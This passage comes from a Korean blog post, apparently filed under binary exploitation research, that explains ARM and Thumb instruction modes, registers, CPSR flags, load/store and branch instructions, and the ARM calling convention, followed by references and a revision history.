32bit인 것도 있다. <strong>32bit 명령어를 <code>ARM Instruction</code></strong> 이라고 하고 <strong>16bit 짜리 명령어를 <code>Thumb Instruction</code></strong> 이라고 한다.</p><p><strong>컴파일러가 <code>CPSR</code>의 5번째 bit인 <code>T flag</code>를 참조해서 ARM 모드인지, Thumb 모드인지 판단</strong>해서 적용시킨다. <strong><code>BX</code> / <code>BLX</code> 명령을 이용해서 모드 전환</strong>이 이루어지며 Branch를 수행한다.</p><ul><li><strong>ARM Instruction</strong><ul><li><strong>처리속도를 우선시</strong> 할 때 사용<ul><li>ARM은 32bit 프로세서이며 16bit 명령어를 처리하기 위해선 처리 과정을 한 번더 거치게 된다. (즉, 효율성이 감소)</li></ul></li></ul></li><li><strong>Thumb Instruction</strong><ul><li><strong>코드 길이를 줄일때</strong> 사용<ul><li>ARM 모드로 작성한 프로그램의 크기의 70%밖에 되지 않는다.</li><li><strong>셸코드를 작성할 때도 당연히 바이트 수를 줄이기 위해 Thumb 모드를 사용</strong>하는게 좋다.</li></ul></li></ul></li></ul><p><hr></p><h3 id="ARM-레지스터"><a href="#ARM-레지스터" class="headerlink" title="ARM 레지스터"></a>ARM 레지스터</h3><ul><li><code>R0 ~ R10</code>: 범용레지스터로서 연산 및 임시 저장 장소 등으로 사용 (<strong>Thumb Mode는 R7까지 사용</strong>)<ul><li><strong>R0</strong>: 함수의 <strong>반환 값</strong>을 저장, 함수의 <strong>첫 번째 인자</strong> 저장</li><li><strong>R1</strong>: 함수의 <strong>두 번째 인자</strong> 저장 </li><li><strong>R2</strong>: 함수의 <strong>세 번째 인자</strong> 저장</li><li><strong>R3</strong>: 함수의 <strong>네 번째 인자</strong> 저장</li><li><strong>R7</strong>: <strong>Thumb mode에서 syscall number</strong>를 저장</li></ul></li><li><code>R11 ~ R15</code>: 특수한 목적으로 사용<ul><li><strong>R13</strong>:  <code>SP</code>(Stack Pointer),  <strong>현재 스택의 최상단의 주소</strong>를 저장</li><li><strong>R14</strong>: <code>LR</code>(Link Register), <strong>복귀 주소</strong>(return address)를 저장</li><li><strong>R15</strong>: <code>PC</code>(Program Counter), <strong>다음 실행할 명령의 주소</strong>를 저장</li></ul></li><li><code>PSR</code>: 상태 레지스터<ul><li><strong>SPSR</strong>: 모드가 변경될 때 마다 변경되기 전의 CPSR을 저장</li><li><strong>CPSR</strong>: <strong>현재 동작중인 프로세서의 상태</strong>를 저장<ul><li><img src="https://user-images.githubusercontent.com/43925259/65316068-33326080-dbd4-11e9-9492-eb2fe8ca2f68.png" alt="1568717584116"><ul><li><strong>N</strong>: 연산 결과가 음수일 경우</li><li><strong>Z</strong>: 연산 결과가 0인 경우</li><li><strong>C</strong>: 연산 결과에서 자리올림이 발생한 경우</li><li><strong>V</strong>: 연산 결과가 overflow가 발생한 경우</li></ul></li></ul></li></ul></li></ul><p><hr></p><h3 id="ARM-Intruction"><a href="#ARM-Intruction" class="headerlink" title="ARM Intruction"></a>ARM Intruction</h3><ul><li><p><strong>Load / Store 구조를 사용</strong></p><ul><li>ARM은 메모리 내의 데이터에 직접 접근이 불가능</li><li><code>LDR</code>, <code>STR</code>과 같은 명령을 통해서 메모리와 레지스터 사이에 데이터를 전송</li></ul></li><li><p><strong>3-Address data Processing</strong></p><ul><li><img src="https://user-images.githubusercontent.com/43925259/65316071-34fc2400-dbd4-11e9-8ce2-2359099cb254.png" alt="1568719174865"></li><li>두 개의 source operand와 result operand를 사용</li><li>result 위치엔 항상 레지스터가 오고 OP 자리엔 레지스터 또는 상수</li></ul></li><li><p><strong>모든 명령어는 조건부 실행 가능</strong></p><ul><li>CPSR 레지스터에 Condition Flag 정보에 맞춰서 분기 (N, Z, C, V)</li><li>ARM의 모든 명령어는 조건필드를 가지고 있고 조건에 따라 실행 여부를 결정<ul><li>Ex) ADD<strong>EQ</strong> r0, r1, r2    ; if Z=1, then r0 = r1 + r2</li></ul></li><li>명령어의 접미사<ul><li><img src="https://user-images.githubusercontent.com/43925259/65315814-b901dc00-dbd3-11e9-9416-5103eb9595a0.png" alt="1568967362291"></li></ul></li></ul><hr></li></ul><h3 id="ARM-Assembly"><a href="#ARM-Assembly" class="headerlink" title="ARM Assembly"></a>ARM Assembly</h3><ul><li><h5 id="Branch-Instruction-분기-명령"><a href="#Branch-Instruction-분기-명령" class="headerlink" title="Branch Instruction (분기 명령)"></a>Branch Instruction (분기 명령)</h5><ul><li><strong><code>B (Branch)</code></strong><ul><li>사용법: <code>B 주소</code></li><li>B 명령어 뒤에 <strong>지정된 주소로 분기</strong>하는 명령</li><li>x86의 <code>jmp</code>와 유사</li></ul></li><li><strong><code>BL (Branch with Link)</code> </strong><ul><li>사용법: <code>BL 주소</code></li><li>BL 명령어 뒤에 <strong>지정된 주소로 분기하되 복귀 주소를 R14에 저장</strong></li><li>x86의 <code>call</code>과 유사</li></ul></li><li><strong><code>BX (Branch indirect)</code></strong><ul><li>사용법: <code>BX 레지스터</code></li><li>BX 명령어 뒤에 <strong>지정된 레지스터로 분기</strong>하는 명령</li></ul></li><li><strong><code>BLX (Branch indirect with Link)</code></strong><ul><li>사용법: <code>BLX 레지스터</code></li><li>BLX 명령어 뒤에 <strong>지정된 레지스터로 분기하되 복귀 주소를 R14에 저장</strong></li></ul></li></ul></li><li><h5 id="LDR-and-STR-Instruction-단일-데이터-이동명령"><a href="#LDR-and-STR-Instruction-단일-데이터-이동명령" class="headerlink" title="LDR and STR Instruction (단일 데이터 이동명령)"></a>LDR and STR Instruction (단일 데이터 이동명령)</h5><ul><li><p><strong><code>LDR (Load register)</code></strong></p><ul><li>사용법: <code>ldr 레지스터, 메모리</code></li><li><strong>메모리에서 4byte 읽어서 레지스터로 복사</strong>하는 명령</li></ul></li><li><p><strong><code>STR (Store register)</code></strong></p><ul><li>사용법: <code>str 레지스터, 메모리</code></li><li><strong>레지스터의 값을 메모리에 4byte 만큼 복사</strong>하는 명령 (<strong>복사 방향 주의</strong>)</li></ul></li><li><p><strong><code>LDR, STR의 접미사</code></strong></p><ul><li><strong>H: 2byte</strong></li><li><strong>B: 1byte</strong></li><li>그냥 사용하면 4byte로 동작하고 <code>LDRH</code>, <code>STRB</code>와 같이 <code>2byte</code>, <code>1byte</code>씩 동작가능</li></ul></li><li><p><code>pre-indexed와 post-indexed</code></p><ul><li><p><strong>pre-indexed</strong></p><ul><li>LDR R0, [R1, #0x8]과 같이 <strong>오프셋이 대괄호안에 들어가있는 경우</strong></li><li><strong>기준 레지스터(예시에서의 R1)로부터 오프셋만큼 떨어진 주소에서 4byte 만큼 복사</strong></li><li><strong>기준 레지스터의 값은 변하지 않음.</strong></li><li><strong>끝에 !를 붙히면 기준 레지스터의 값이 변함.</strong> (LDR R0, [R1, #0x8]!)</li></ul></li><li><p><strong>post-indexed</strong></p><ul><li>LDR R0, [R1], 0x8과 같이 <strong>오프셋이 대괄호밖에 있는 경우</strong></li><li><strong>기준 레지스터(예시에서의 R1)에서 4byte만큼 복사 후 기준 레지스터 값을 오프셋 만큼 변경</strong></li></ul></li></ul></li></ul></li></ul><ul><li><p><strong>LDM and STM Instruction (여러개의 데이터  이동)</strong> </p><ul><li><strong><code>LDM (Load Multiple Register)</code></strong><ul><li>사용법1: <code>LDM??  메모리, {레지스터, 레지스터, ...}</code></li><li>사용법2: <code>LDM?? 메모리, {레지스터-레지스터}</code></li><li><strong>메모리에 있는 값을 레지스터로 복사하는 명령</strong>이다. (<strong>복사 방향 주의</strong>)</li><li>무조건 <strong>워드(32-bit) 단위의 복사만 존재</strong>한다.</li><li>레지스터를 표현할때 쉼표(,)로 쓰면 특정 레지스터를 의미하고 하이픈(-)을 사용하면 연속된 레지스터를 참조하는 것이다. (R1-R3 이라면 R1, R2, R3과 동일)</li></ul></li><li><strong><code>STM (Store Multiple Register)</code></strong><ul><li>사용법1: <code>STM?? 메모리, {레지스터, 레지스터, ...}</code></li><li>사용법2: <code>STM?? 메모리, {레지스터-레지스터}</code></li><li><strong>여러개의 레지스터 값을 메모리로 복사하는 명령</strong>이다. </li><li>마찬가지로 <strong>워드(32-bit) 단위의 복사만 존재</strong>한다.</li></ul></li><li><strong><code>LDM과 STM의 어드레싱 모드</code></strong> (<strong>LDM과 STM의 접미사</strong>)<ul><li><code>IA</code>: 연산 이후 메모리 값(베이스 레지스터)을 한 워드 증가</li><li><code>IB</code>: 연산 이전에 메모리 값을 한 워드 증가</li><li><code>DA</code>: 연산 이후에 메모리 값을 한 워드 감소</li><li><code>DB</code>: 연산 이전에 메모리 값을 한 워드 감소</li></ul></li></ul></li></ul><p><hr></p><h3 id="콜링-컨벤션"><a href="#콜링-컨벤션" class="headerlink" title="콜링 컨벤션"></a>콜링 컨벤션</h3><ul><li><strong><code>R0 ~ R3</code> 까지 순서대로 인자를 저장</strong></li><li><strong>인자가 5개 이상이면 <code>스택</code>을 사용</strong></li><li><strong>함수의 반환 값은 <code>R0</code>을 사용</strong></li><li><strong><code>BL</code> 또는 <code>BLX</code>를 사용할 때 복귀 주소를 <code>R14</code> 레지스터에 저장</strong></li></ul><p><hr></p><h3 id="레퍼런스"><a href="#레퍼런스" class="headerlink" title="레퍼런스"></a>레퍼런스</h3><p><a href="http://blog.daum.net/goldhjw/7406090" target="_blank" rel="noopener">http://blog.daum.net/goldhjw/7406090</a></p><p><a href="http://trace32.com/wiki/index.php/Cortex-M" target="_blank" rel="noopener">http://trace32.com/wiki/index.php/Cortex-M</a></p><p><a href="https://dreamlog.tistory.com/121" target="_blank" rel="noopener">https://dreamlog.tistory.com/121</a></p><p><a href="https://drive.google.com/file/d/0B_sx6nhKufWqRTdZemNETVhxVWM/view" target="_blank" rel="noopener">https://drive.google.com/file/d/0B_sx6nhKufWqRTdZemNETVhxVWM/view</a></p><hr><h3 id="문서-역사"><a href="#문서-역사" class="headerlink" title="문서 역사"></a>문서 역사</h3><p><code>2019-09-20</code>  <strong>JSec: 최초 작성</strong></p><hr><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
          <category> ㄴ Research </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
